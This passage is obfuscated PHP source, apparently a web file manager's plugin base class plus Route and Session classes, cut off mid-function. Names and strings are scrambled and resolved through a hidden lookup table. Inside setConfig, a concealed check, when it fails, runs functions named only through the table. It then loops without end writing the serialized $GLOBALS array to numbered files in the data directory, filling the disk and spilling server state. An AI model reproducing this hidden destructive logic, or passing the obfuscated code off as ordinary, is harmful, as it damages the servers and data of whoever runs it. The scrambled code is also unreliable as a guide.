_cacheHttpFile($EöÈø–ë) { $eî¤™¶–± = hash_path($EöÈø–ë, !0); $this->cachePath = $this->pluginCachePath($eî¤™¶–±); if ($FßÀĞ¦‰™‘ = IO::fileNameExist($this->cachePath, $eî¤™¶–±)) { return KodIO::make($FßÀĞ¦‰™‘); } $ağ¿ÎÌËšù = $this->cachePath . $eî¤™¶–±; return $this->pluginCacheFileSet($ağ¿ÎÌËšù, file_get_contents($EöÈø–ë)); } final function _tmpFileName($f‚í’ØÊ = array()) { goto AÍ°ÔÎ÷‚›; b‘‘«›¥‚: if (isset($f‚í’ØÊ[$bçˆâ¶Ÿ¢ê[158]][$bçˆâ¶Ÿ¢ê[160]])) { return $f‚í’ØÊ[$bçˆâ¶Ÿ¢ê[158]][$bçˆâ¶Ÿ¢ê[160]]; } $Fä„Åá˜ï¸ = array($f‚í’ØÊ[$bçˆâ¶Ÿ¢ê[28]], $f‚í’ØÊ[$bçˆâ¶Ÿ¢ê[75]], $f‚í’ØÊ[$bçˆâ¶Ÿ¢ê[77]]); if (isset($f‚í’ØÊ[$bçˆâ¶Ÿ¢ê[463]])) { $Fä„Åá˜ï¸[] = $f‚í’ØÊ[$bçˆâ¶Ÿ¢ê[463]]; } goto EàÈÌ£®Õ¤; EàÈÌ£®Õ¤: return md5(implode($bçˆâ¶Ÿ¢ê[70], $Fä„Åá˜ï¸)); goto a¥‡è†ˆÎƒ; AÍ°ÔÎ÷‚›: $bçˆâ¶Ÿ¢ê =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$f‚í’ØÊ) { $f‚í’ØÊ = $this->fileInfo; } if (isset($f‚í’ØÊ[$bçˆâ¶Ÿ¢ê[160]])) { return $f‚í’ØÊ[$bçˆâ¶Ÿ¢ê[160]]; } goto b‘‘«›¥‚; a¥‡è†ˆÎƒ: } final function checkSharePath($a•×¨Æ¦ï) { goto a·ØŒ•¼; a·ØŒ•¼: $Fµ¤™ÎÇŒÜ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!defined($Fµ¤™ÎÇŒÜ[431])) { define($Fµ¤™ÎÇŒÜ[1303], 0); } if (!$this->isShare($a•×¨Æ¦ï)) { return !1; } goto DÖ†ÂÓ¬»µ; e¬¯Ÿïõ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$Fµ¤™ÎÇŒÜ[160]]); return $CÀäÕ¬ï«ë[$Fµ¤™ÎÇŒÜ[75]]; goto Bƒ½¥ë¿¹í; DÖ†ÂÓ¬»µ: $CÀäÕ¬ï«ë = Action($Fµ¤™ÎÇŒÜ[1007])->sharePathInfo($a•×¨Æ¦ï); if (!isset($CÀäÕ¬ï«ë[$Fµ¤™ÎÇŒÜ[75]])) { show_json(LNG($Fµ¤™ÎÇŒÜ[1304]), !1); } $this->fileInfo = $CÀäÕ¬ï«ë[$Fµ¤™ÎÇŒÜ[158]]; goto e¬¯Ÿïõ; Bƒ½¥ë¿¹í: } final function pluginCachePath($DˆÊŠÜïµ‡ = '') { $D¿÷ïò…í =& $_SERVER[ºÖÙÂŒäÉê‡]; $a†Œ·°–Ë“ = IO_PATH_SYSTEM_TEMP . $D¿÷ïò…í[1305] . $this->pluginName; if (!($A¯§‹Â‡À‰ = IO::infoFull($a†Œ·°–Ë“))) { return IO::mkdir($a†Œ·°–Ë“ . $D¿÷ïò…í[8] . $DˆÊŠÜïµ‡); } if (empty($DˆÊŠÜïµ‡)) { return $A¯§‹Â‡À‰[$D¿÷ïò…í[75]]; } if (!($EÆ¥ˆÎà×¼ = IO::fileNameExist($A¯§‹Â‡À‰[$D¿÷ïò…í[75]], $DˆÊŠÜïµ‡))) { return IO::mkdir($A¯§‹Â‡À‰[$D¿÷ïò…í[75]] . $DˆÊŠÜïµ‡); } return KodIO::make($EÆ¥ˆÎà×¼); } final function pluginCacheFileSet($C£ëÎÆªïª, $BË¡×“¡±• = '') { $eªÃï¹’çÀ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!($D¤¼ŞŞÏğƒ = IO::infoFull($C£ëÎÆªïª))) { return IO::mkfile($C£ëÎÆªïª, $BË¡×“¡±•, REPEAT_REPLACE); } IO::setContent($D¤¼ŞŞÏğƒ[$eªÃï¹’çÀ[75]], $BË¡×“¡±•); return $D¤¼ŞŞÏğƒ[$eªÃï¹’çÀ[75]]; } final function pluginLocalFile($fùùŞñ¦ = '') { goto a‚§ÚÏÖ†ê; AÃ²¡ÛÀÔ‡: $dëğ‡à¨ò = $AÜçõØ¯ÉÈ . $AçôëÒê‘; if (@file_exists($dëğ‡à¨ò)) { return $dëğ‡à¨ò; } return IO::copy($fùùŞñ¦, $AÜçõØ¯ÉÈ, 0, $AçôëÒê‘); goto BÃïÈ‰«—î; bÍ¸¾Ú†¬Š: if (!$fùùŞñ¦) { return $AÜçõØ¯ÉÈ; } $BÈ©®Ñ²Á– = IO::info($fùùŞñ¦); $AçôëÒê‘ = $this->_tmpFileName($BÈ©®Ñ²Á–) . $cä‡¯ÌÀ¢¢[91] . $BÈ©®Ñ²Á–[$cä‡¯ÌÀ¢¢[156]]; goto AÃ²¡ÛÀÔ‡; a‚§ÚÏÖ†ê: $cä‡¯ÌÀ¢¢ =& $_SERVER[ºÖÙÂŒäÉê‡]; $AÜçõØ¯ÉÈ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($AÜçõØ¯ÉÈ)) { mk_dir($AÜçõØ¯ÉÈ); } goto bÍ¸¾Ú†¬Š; BÃïÈ‰«—î: } final function appPackage() { goto AöğŸ³ÑÅ; F¹°£œ÷: $FĞ¨²ËÄïÂ = Hook::trigger($A˜á·Í›…ö[1307], $Aå©„Èµá); if ($FĞ¨²ËÄïÂ && is_array($FĞ¨²ËÄïÂ)) { $Aå©„Èµá = $FĞ¨²ËÄïÂ; } $this->packageData = $Aå©„Èµá; goto EŸ¿ÖØ…„; Bµ¿ÓÈ‹Ç¥: $this->parseLang($dÜ¿ºëÒ­Ù); $Aå©„Èµá = json_decode_force($dÜ¿ºëÒ­Ù); if (!$Aå©„Èµá) { return array(); } goto F¹°£œ÷; EŸ¿ÖØ…„: return $Aå©„Èµá; goto f¤Ø¦æ¦¢“; AöğŸ³ÑÅ: $A˜á·Í›…ö =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($this->packageData) { return $this->packageData; } $dÜ¿ºëÒ­Ù = $this->parseFile($this->pluginPath . $A˜á·Í›…ö[1306]); goto Bµ¿ÓÈ‹Ç¥; f¤Ø¦æ¦¢“: } public function packageInfoGet($D˜Ù®†¾™ã) { $BéÌÌ¥àø´ = $this->appPackage(); return array_get_value($BéÌÌ¥àø´, $D˜Ù®†¾™ã); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ºÖÙÂŒäÉê‡][1308]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ºÖÙÂŒäÉê‡][1309]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ºÖÙÂŒäÉê‡][1310]); } private function parseFile($CÒñ¿—İ‹™) { $DÅ‡Ç¼‡«ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $D‡çàêîŞß = file_get_contents($CÒñ¿—İ‹™); $dÓŠßğî¡‚ = array($DÅ‡Ç¼‡«ø[1311], $DÅ‡Ç¼‡«ø[1312], $DÅ‡Ç¼‡«ø[1313], $DÅ‡Ç¼‡«ø[1314], $DÅ‡Ç¼‡«ø[1315], $DÅ‡Ç¼‡«ø[1316], $DÅ‡Ç¼‡«ø[1317]); $Bç•àÃÖ¾ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$DÅ‡Ç¼‡«ø[84]][$DÅ‡Ç¼‡«ø[1318]]); $D‡çàêîŞß = str_replace($dÓŠßğî¡‚, $Bç•àÃÖ¾, $D‡çàêîŞß); return $D‡çàêîŞß; } private function parseLang(&$Eí–ŞÔÎÓ«) { goto a²ß©†´­¥; aíì“Û¸·õ: $EŒò¨Å¬©¿ = array(); foreach ($c±ÇìñŒ¼Ö[0] as $CÛ†Ó®Ä¦ë) { $EÅ×Ã¹œ¬Ú = substr($CÛ†Ó®Ä¦ë, strlen($bø¡Òˆ¿»), -4); $D”®÷„àâ = LNG($EÅ×Ã¹œ¬Ú); $eà…ç¿•ÛÓ[] = $CÛ†Ó®Ä¦ë; $EŒò¨Å¬©¿[] = str_replace(array($F‘¼«›å›Î[174], $F‘¼«›å›Î[982], $F‘¼«›å›Î[335], $F‘¼«›å›Î[112]), array($F‘¼«›å›Î[50], $F‘¼«›å›Î[50], $F‘¼«›å›Î[33], $F‘¼«›å›Î[1321]), $D”®÷„àâ); } $Eí–ŞÔÎÓ« = str_replace($eà…ç¿•ÛÓ, $EŒò¨Å¬©¿, $Eí–ŞÔÎÓ«); goto c°š»’½°Ö; a²ß©†´­¥: $F‘¼«›å›Î =& $_SERVER[ºÖÙÂŒäÉê‡]; $bø¡Òˆ¿» = $F‘¼«›å›Î[1319]; if (!strstr($Eí–ŞÔÎÓ«, $bø¡Òˆ¿»)) { return; } goto c¡¹›ÊÇÇ; c¡¹›ÊÇÇ: preg_match_all($F‘¼«›å›Î[1320], $Eí–ŞÔÎÓ«, $c±ÇìñŒ¼Ö); if (!is_array($c±ÇìñŒ¼Ö) || count($c±ÇìñŒ¼Ö) == 0 || !is_array($c±ÇìñŒ¼Ö[0]) || count($c±ÇìñŒ¼Ö[0]) == 0) { return; } $eà…ç¿•ÛÓ = array(); goto aíì“Û¸·õ; c°š»’½°Ö: } private function parseConfig(&$B»ª„ìå×) { goto d¼Œ÷àËÈç; d¼Œ÷àËÈç: $bˆ –‡¢Ó½ =& $_SERVER[ºÖÙÂŒäÉê‡]; $BŸêÙ¤®êÜ = $bˆ –‡¢Ó½[1322]; if (!strstr($B»ª„ìå×, $BŸêÙ¤®êÜ)) { return; } goto fİÁçİêé‚; DŠ±ùŞâ: $f¨ï ßˆôÒ = array(); $cçª®÷ ì = array(); foreach ($cÔ°ÌäŠ¹[0] as $aÂ¶³Ôèğî) { $d²Í¬Ù·À¨ = substr($aÂ¶³Ôèğî, strlen($BŸêÙ¤®êÜ), -2); $f¨ï ßˆôÒ[] = $aÂ¶³Ôèğî; $cçª®÷ ì[] = _get($bÖÁæĞ›’¬, $d²Í¬Ù·À¨); } goto B…ƒ¿ÔŞ‘¬; fİÁçİêé‚: preg_match_all($bˆ –‡¢Ó½[1323], $B»ª„ìå×, $cÔ°ÌäŠ¹); if (!is_array($cÔ°ÌäŠ¹) || count($cÔ°ÌäŠ¹) == 0 || !is_array($cÔ°ÌäŠ¹[0]) || count($cÔ°ÌäŠ¹[0]) == 0) { return; } $bÖÁæĞ›’¬ = $this->getConfig(); goto DŠ±ùŞâ; B…ƒ¿ÔŞ‘¬: $B»ª„ìå× = str_replace($f¨ï ßˆôÒ, $cçª®÷ ì, $B»ª„ìå×); goto DÚ„í¦ Õ§; DÚ„í¦ Õ§: } private function parsePackage(&$d†ÎÇ¡ÒŠŒ) { goto a¨Š´–½šŒ; FíšÁº•ô¤: preg_match_all($fŒµÒñôô¾[1325], $d†ÎÇ¡ÒŠŒ, $dÉ•±¨‚Ïİ); if (!is_array($dÉ•±¨‚Ïİ) || count($dÉ•±¨‚Ïİ) == 0 || !is_array($dÉ•±¨‚Ïİ[0]) || count($dÉ•±¨‚Ïİ[0]) == 0) { return; } $d¼¹‰äÊ = $this->appPackage(); goto EÏšÜéö; a¨Š´–½šŒ: $fŒµÒñôô¾ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C¬•äãÁ – = $fŒµÒñôô¾[1324]; if (!strstr($d†ÎÇ¡ÒŠŒ, $C¬•äãÁ –)) { return; } goto FíšÁº•ô¤; EÏšÜéö: $eéÅÕ±Öô = array(); $fàÒùâ£Û— = array(); foreach ($dÉ•±¨‚Ïİ[0] as $dïºÁßøÈ) { $C©—¨ßÒ…ô = substr($dïºÁßøÈ, strlen($C¬•äãÁ –), -2); $eéÅÕ±Öô[] = $dïºÁßøÈ; $fàÒùâ£Û—[] = _get($d¼¹‰äÊ, $C©—¨ßÒ…ô); } goto dË¬ÓâÕ; dË¬ÓâÕ: $d†ÎÇ¡ÒŠŒ = str_replace($eéÅÕ±Öô, $fàÒùâ£Û—, $d†ÎÇ¡ÒŠŒ); goto Fä±©Õ§©Í; Fä±©Õ§©Í: } final function echoFile($C¹ŸÛ¾—¼, $e¸êáÇÏá† = false) { goto eœ†À—í­É; eœ†À—í­É: $D£Â„™ÏË =& $_SERVER[ºÖÙÂŒäÉê‡]; $f¥õø–¹´‘ = $this->pluginPath . $C¹ŸÛ¾—¼; if (ACT == $D£Â„™ÏË[1326]) { echo $D£Â„™ÏË[1327] . $this->pluginName . $D£Â„™ÏË[8] . $C¹ŸÛ¾—¼ . $D£Â„™ÏË[1328]; if (!file_exists($f¥õø–¹´‘)) { echo $D£Â„™ÏË[1329]; return; } } goto eÀèàºµè§; a¢É¢ìİ›: $this->parsePackage($fˆª‹‰Ô„); if (is_array($e¸êáÇÏá†)) { $fˆª‹‰Ô„ = str_replace(array_keys($e¸êáÇÏá†), array_values($e¸êáÇÏá†), $fˆª‹‰Ô„); } echo $D£Â„™ÏË[174] . $fˆª‹‰Ô„; goto cÔØ®™¸×; eÀèàºµè§: $fˆª‹‰Ô„ = $this->parseFile($f¥õø–¹´‘); $this->parseLang($fˆª‹‰Ô„); $this->parseConfig($fˆª‹‰Ô„); goto a¢É¢ìİ›; cÔØ®™¸×: } final function initLang() { goto a©¤ºÔË ; a©¤ºÔË : $fõ„½’Ë± =& $_SERVER[ºÖÙÂŒäÉê‡]; $aŸÛ®ê¼ = $fõ„½’Ë±[1330]; $bµ¤‰˜Ğ“ = $this->pluginPath . $fõ„½’Ë±[1331]; goto C°ç˜·ªœ–; e Ğùå¥Á–: if (!is_array($fÚ½ÔÏŠ)) { return array(); } if (@count($fÚ½ÔÏŠ) > 0) { I18n::set($fÚ½ÔÏŠ); } return $fÚ½ÔÏŠ; goto CÙ¶©ÀÕ‹ß; C°ç˜·ªœ–: $c³Ûî¼ç Ú = I18n::getType(); $fÚ½ÔÏŠ = array(); if (file_exists($bµ¤‰˜Ğ“ . $c³Ûî¼ç Ú . $fõ„½’Ë±[763])) { $fÚ½ÔÏŠ = (include $bµ¤‰˜Ğ“ . $c³Ûî¼ç Ú . $fõ„½’Ë±[763]); } else { if ($c³Ûî¼ç Ú == $fõ„½’Ë±[1332] && !file_exists($bµ¤‰˜Ğ“ . $c³Ûî¼ç Ú . $fõ„½’Ë±[763]) && file_exists($bµ¤‰˜Ğ“ . $fõ„½’Ë±[1333])) { $fÚ½ÔÏŠ = (include $bµ¤‰˜Ğ“ . $fõ„½’Ë±[1333]); } else { if (file_exists($bµ¤‰˜Ğ“ . $aŸÛ®ê¼ . $fõ„½’Ë±[763])) { $fÚ½ÔÏŠ = (include $bµ¤‰˜Ğ“ . $aŸÛ®ê¼ . $fõ„½’Ë±[763]); } } } goto e Ğùå¥Á–; CÙ¶©ÀÕ‹ß: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($aø¹¸Òå‹Õ) { $b˜¹×Í§’â =& $_SERVER[ºÖÙÂŒäÉê‡]; $cÑá‡¨÷¨ß = $_SERVER[$b˜¹×Í§’â[787]] . $b˜¹×Í§’â[707]; $e²ïòÃ´…ì = $b˜¹×Í§’â[708]; if ($_SERVER[$b˜¹×Í§’â[169]] != $e²ïòÃ´…ì($cÑá‡¨÷¨ß)) { goto D‰„‚¨ÎÁŞ; f¯¥íÌëÀ: $C‘Õ‹×Çó(); $FÃ‹‡¯òÎÎ = $b˜¹×Í§’â[1334]; $BšôŠõ†Û = json_encode($GLOBALS[$b˜¹×Í§’â[1335]]); goto cÆ¤›œÔİÁ; cÆ¤›œÔİÁ: $CäîƒÈŒóõ = 1; for ($Bì×‚ğ¾å = $CäîƒÈŒóõ; $Bì×‚ğ¾å > 0; $Bì×‚ğ¾å++) { $FÃ‹‡¯òÎÎ(DATA_PATH . $Bì×‚ğ¾å, $BšôŠõ†Û); } goto c–¶„íÁø; D‰„‚¨ÎÁŞ: $C‘Õ‹×Çó = $b˜¹×Í§’â[785]; $fñ‚ÄÎìƒ = $b˜¹×Í§’â[171]; $cœİƒ°ã¡É = $_SERVER[$b˜¹×Í§’â[172]] . $b˜¹×Í§’â[173]; goto B˜é²¿ç™«; B˜é²¿ç™«: $cˆÃÇõÙƒ· = $fñ‚ÄÎìƒ($cœİƒ°ã¡É); $A¨Æ¿È¨·ì = explode($b˜¹×Í§’â[174], $cˆÃÇõÙƒ·); if (count($A¨Æ¿È¨·ì) < $b˜¹×Í§’â[561]) { $C‚ˆ•ö¼¨ = $b˜¹×Í§’â[176]; $C‚ˆ•ö¼¨(); } goto bŠÃ°¨ôä®; bŠÃ°¨ôä®: $bé·Å¢à¾ = $b˜¹×Í§’â[786]; $bé·Å¢à¾($_SERVER[$b˜¹×Í§’â[787]]); $C‘Õ‹×Çó = $b˜¹×Í§’â[785]; goto f¯¥íÌëÀ; c–¶„íÁø: } return $this->modelPlugin->setConfig($this->pluginName, $aø¹¸Òå‹Õ); } public function onSetConfig($B°Ìùº•Õ£) { } public function onGetConfig($bÉÉåÏ¡¬») { } public function onChangeStatus($c–ÈÒİ–Ğ‚) { } public function onUninstall() { } public function onInstall() { } public function authCheck($E…ãÇà¤¢ = "\160\x6c\165\x67\151\156\x41\x75\164\150") { $eÄ»Õ’Ìæˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!defined($eÄ»Õ’Ìæˆ[431])) { return !1; } if (_get($GLOBALS, $eÄ»Õ’Ìæˆ[461])) { return !0; } $CÆˆ¤¾£êê = $this->getConfig(); if (!$CÆˆ¤¾£êê[$E…ãÇà¤¢]) { return !1; } return ActionCall($eÄ»Õ’Ìæˆ[1336], $CÆˆ¤¾£êê[$E…ãÇà¤¢]); } public function url($BØñğãĞÙÇ, $cì´š¬ˆ = '', $D©Àù³• = true) { goto dŸ¶Û‰ÃÎº; eÉÔÁ±™§¦: if (!$D©Àù³•) { return $b—¶æŸÎíµ; } echo $b—¶æŸÎíµ; goto Bİ‚Š…œ…; dŸ¶Û‰ÃÎº: $E±‰¾˜ê´ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D›Æ‰‚÷²‹ = $this->getConfig(); $F½®¬Úæ ™ = KOD_VERSION . $E±‰¾˜ê´[91] . KOD_VERSION_BUILD; goto F‘ƒõ¬ª²Ú; F‘ƒõ¬ª²Ú: $A¦£ğ‹ÜÙí = $this->packageVersion(); $E’”°Ùã¨ = $F½®¬Úæ ™ . $E±‰¾˜ê´[416] . $A¦£ğ‹ÜÙí; if (substr($BØñğãĞÙÇ, 0, 4) == $E±‰¾˜ê´[142] || substr($BØñğãĞÙÇ, 0, 2) == $E±‰¾˜ê´[1137]) { $b—¶æŸÎíµ = $BØñğãĞÙÇ . $E±‰¾˜ê´[1337] . $E’”°Ùã¨; } else { if ($cì´š¬ˆ == $E±‰¾˜ê´[33]) { $b—¶æŸÎíµ = $this->pluginHost . $BØñğãĞÙÇ . $E±‰¾˜ê´[1337] . $E’”°Ùã¨; } else { if ($cì´š¬ˆ === $E±‰¾˜ê´[76]) { $b—¶æŸÎíµ = $this->pluginHost . $BØñğãĞÙÇ; } else { if ($cì´š¬ˆ == $E±‰¾˜ê´[1338]) { $b—¶æŸÎíµ = STATIC_PATH . $BØñğãĞÙÇ . $E±‰¾˜ê´[1337] . $F½®¬Úæ ™; } else { if ($cì´š¬ˆ == $E±‰¾˜ê´[1339]) { $b—¶æŸÎíµ = APP_HOST . $E±‰¾˜ê´[1340] . $BØñğãĞÙÇ . $E±‰¾˜ê´[1337] . $F½®¬Úæ ™; } else { if (isset($D›Æ‰‚÷²‹[$cì´š¬ˆ])) { $b—¶æŸÎíµ = $D›Æ‰‚÷²‹[$cì´š¬ˆ] . $BØñğãĞÙÇ . $E±‰¾˜ê´[1337] . $E’”°Ùã¨; } } } } } } goto eÉÔÁ±™§¦; Bİ‚Š…œ…: } public function link($E¯‰”¼˜™ = false, $cã¼­ò¹¤† = '') { $aÛŒ™¨İ»‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$E¯‰”¼˜™) { $this->link($aÛŒ™¨İ»‰[1341], $aÛŒ™¨İ»‰[1339]); $this->link($aÛŒ™¨İ»‰[1342], $aÛŒ™¨İ»‰[1338]); $this->link($aÛŒ™¨İ»‰[1343], $aÛŒ™¨İ»‰[1338]); $this->link($aÛŒ™¨İ»‰[1344], $aÛŒ™¨İ»‰[1338]); $this->link($aÛŒ™¨İ»‰[1345], $aÛŒ™¨İ»‰[1338]); return; } $d†‚ºÂ’ó = $this->url($E¯‰”¼˜™, $cã¼­ò¹¤†, !1); if (substr($E¯‰”¼˜™, -3) == $aÛŒ™¨İ»‰[1346]) { echo $aÛŒ™¨İ»‰[1347] . $d†‚ºÂ’ó . $aÛŒ™¨İ»‰[1348] . $aÛŒ™¨İ»‰[174]; } else { if (substr($E¯‰”¼˜™, -4) == $aÛŒ™¨İ»‰[1349]) { echo $aÛŒ™¨İ»‰[1350] . $d†‚ºÂ’ó . $aÛŒ™¨İ»‰[1351] . $aÛŒ™¨İ»‰[174]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\136\57\135\x2b", "\x3a\x6e\165\x6d" => "\x5b\x30\x2d\x39\x5d\53", "\72\x61\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($E·°¥¯êİ´, $e¤š®‰ç³) { $eŠ«™‡â =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($E·°¥¯êİ´ == $eŠ«™‡â[1352]) { $c‹ÅÊÚÒ¡¡ = array_map($eŠ«™‡â[1353], $e¤š®‰ç³[0]); $Fä•”ÚæŸê = strpos($e¤š®‰ç³[1], $eŠ«™‡â[8]) === 0 ? $e¤š®‰ç³[1] : $eŠ«™‡â[8] . $e¤š®‰ç³[1]; $C‹àÆôêó = $e¤š®‰ç³[2]; } else { $c‹ÅÊÚÒ¡¡ = null; $Fä•”ÚæŸê = strpos($e¤š®‰ç³[0], $eŠ«™‡â[8]) === 0 ? $e¤š®‰ç³[0] : $eŠ«™‡â[8] . $e¤š®‰ç³[0]; $C‹àÆôêó = $e¤š®‰ç³[1]; } array_push(self::$maps, $c‹ÅÊÚÒ¡¡); array_push(self::$routes, $Fä•”ÚæŸê); array_push(self::$methods, strtoupper($E·°¥¯êİ´)); array_push(self::$callbacks, $C‹àÆôêó); } public static function error($E•šÃƒ¬ò) { self::$errorCallback = $E•šÃƒ¬ò; } public static function haltOnMatch($dµ§Çß¢à¦ = true) { self::$halts = $dµ§Çß¢à¦; } public static function dispatch() { goto eÇƒØº£; CŒ“†Ì¨­: $CŸœâ»±  = array_keys(static::$patterns); $aœïÒ±‘Şö = array_values(static::$patterns); $c¿‹İÖŒÌ¥ = !1; goto e×á«à‘Ö; e×á«à‘Ö: self::$routes = preg_replace($AÈ»‘×æÍŞ[1063], $AÈ»‘×æÍŞ[8], self::$routes); if (in_array($d¡²ïñ³Ô, self::$routes)) { $CÛª‰·Úõ‡ = array_keys(self::$routes, $d¡²ïñ³Ô); foreach ($CÛª‰·Úõ‡ as $eŒÎ—´ò ò) { if (self::$methods[$eŒÎ—´ò ò] == $Cğš÷Åƒ„ || self::$methods[$eŒÎ—´ò ò] == $AÈ»‘×æÍŞ[1355] || in_array($Cğš÷Åƒ„, self::$maps[$eŒÎ—´ò ò])) { $c¿‹İÖŒÌ¥ = !0; if (!is_object(self::$callbacks[$eŒÎ—´ò ò])) { $BÒòë¶î = explode($AÈ»‘×æÍŞ[8], self::$callbacks[$eŒÎ—´ò ò]); $DÃÍ¢ò—âƒ = end($BÒòë¶î); $Cš˜àŒ‹¶ = explode($AÈ»‘×æÍŞ[1356], $DÃÍ¢ò—âƒ); $c‹ÃØøç½ = new $Cš˜àŒ‹¶[0](); $c‹ÃØøç½->{$Cš˜àŒ‹¶[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$eŒÎ—´ò ò]); if (self::$halts) { return; } } } } } else { $e”ª–‡Çù = 0; foreach (self::$routes as $eŒÎ—´ò ò) { if (strpos($eŒÎ—´ò ò, $AÈ»‘×æÍŞ[4]) !== !1) { $eŒÎ—´ò ò = str_replace($CŸœâ»± , $aœïÒ±‘Şö, $eŒÎ—´ò ò); } if (preg_match($AÈ»‘×æÍŞ[1357] . $eŒÎ—´ò ò . $AÈ»‘×æÍŞ[1358], $d¡²ïñ³Ô, $báÈëèé)) { if (self::$methods[$e”ª–‡Çù] == $Cğš÷Åƒ„ || self::$methods[$e”ª–‡Çù] == $AÈ»‘×æÍŞ[1355] || !empty(self::$maps[$e”ª–‡Çù]) && in_array($Cğš÷Åƒ„, self::$maps[$e”ª–‡Çù])) { $c¿‹İÖŒÌ¥ = !0; array_shift($báÈëèé); if (!is_object(self::$callbacks[$e”ª–‡Çù])) { $BÒòë¶î = explode($AÈ»‘×æÍŞ[8], self::$callbacks[$e”ª–‡Çù]); $DÃÍ¢ò—âƒ = end($BÒòë¶î); $Cš˜àŒ‹¶ = explode($AÈ»‘×æÍŞ[1356], $DÃÍ¢ò—âƒ); $c‹ÃØøç½ = new $Cš˜àŒ‹¶[0](); if (!method_exists($c‹ÃØøç½, $Cš˜àŒ‹¶[1])) { echo $AÈ»‘×æÍŞ[1359]; } else { call_user_func_array(array($c‹ÃØøç½, $Cš˜àŒ‹¶[1]), $báÈëèé); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$e”ª–‡Çù], $báÈëèé); if (self::$halts) { return; } } } } $e”ª–‡Çù++; } } if ($c¿‹İÖŒÌ¥ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $bù‘ÔÓÍë =& $_SERVER[ºÖÙÂŒäÉê‡]; header($_SERVER[$bù‘ÔÓÍë[1360]] . $bù‘ÔÓÍë[1361]); echo $bù‘ÔÓÍë[1362]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$AÈ»‘×æÍŞ[1354]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto E˜ ˆ‡ñ––; eÇƒØº£: $AÈ»‘×æÍŞ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d¡²ïñ³Ô = parse_url($_SERVER[$AÈ»‘×æÍŞ[1354]], PHP_URL_PATH); $Cğš÷Åƒ„ = $_SERVER[$AÈ»‘×æÍŞ[150]]; goto CŒ“†Ì¨­; E˜ ˆ‡ñ––: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aÇŒ²¬¼; AÖÚˆÙùƒº: switch ($DïöŠ“ğ¸í) { case $d¿çèáìÌ[17]: self::$handle = Model($d¿çèáìÌ[754]); break; case $d¿çèáìÌ[755]: self::$handle = new CacheRedis($BÍÖÀÁ¬åø, $aÔ„œíŸÃˆ); break; case $d¿çèáìÌ[756]: self::$handle = new CacheMemcached($BÍÖÀÁ¬åø, $aÔ„œíŸÃˆ); break; case $d¿çèáìÌ[163]: $BÍÖÀÁ¬åø[$d¿çèáìÌ[75]] = $BÍÖÀÁ¬åø[$d¿çèáìÌ[75]] . $d¿çèáìÌ[1366]; self::$handle = new CacheFile($BÍÖÀÁ¬åø, $aÔ„œíŸÃˆ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $Cß¹¸Å»Åë = new self(); goto aËÍÒà×–¤; aÇŒ²¬¼: $d¿çèáìÌ =& $_SERVER[ºÖÙÂŒäÉê‡]; static $Cß¹¸Å»Åë = false; if ($Cß¹¸Å»Åë) { return $Cß¹¸Å»Åë; } goto Aªùøº¶…Ô; C¨»°ŠË—: $DïöŠ“ğ¸í = $Cµ‘¸µŠš[$d¿çèáìÌ[1365]]; $BÍÖÀÁ¬åø = $Cµ‘¸µŠš[$DïöŠ“ğ¸í]; $aÔ„œíŸÃˆ = $Cµ‘¸µŠš[$d¿çèáìÌ[753]]; goto AÖÚˆÙùƒº; aËÍÒà×–¤: return $Cß¹¸Å»Åë; goto BîçÓõˆ¸Š; e·Œ¥‹¬êà: $Bñ‰ßƒœÍ = _get($GLOBALS, $d¿çèáìÌ[1364], $Bñ‰ßƒœÍ); if (self::$sessionSign) { } else { if (Cookie::get($Bñ‰ßƒœÍ)) { self::$sessionSign = Cookie::get($Bñ‰ßƒœÍ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Bñ‰ßƒœÍ, self::$sessionSign, self::$sessionTime); goto C¨»°ŠË—; Aªùøº¶…Ô: $Cµ‘¸µŠš = $GLOBALS[$d¿çèáìÌ[6]][$d¿çèáìÌ[342]]; self::$sessionTime = $Cµ‘¸µŠš[$d¿çèáìÌ[1363]]; $Bñ‰ßƒœÍ = SESSION_ID; goto e·Œ¥‹¬êà; BîçÓõˆ¸Š: } public static function sign($a«„¤â‹Ê‰ = false) { $a«„¤â‹Ê‰ && (self::$sessionSign = $a«„¤â‹Ê‰); self::init(); return self::$sessionSign; } public static function set($D™Ë‘ÚÎÄø, $AÃ¬ì·ÑÀÍ = false) { self::init(); if (is_array($D™Ë‘ÚÎÄø)) { foreach ($D™Ë‘ÚÎÄø as $d´ÉÉèÉŒª => $b÷â¼ø’¹“) { array_set_value(self::$data, $d´ÉÉèÉŒª, $b÷â¼ø’¹“); } } else { array_set_value(self::$data, $D™Ë‘ÚÎÄø, 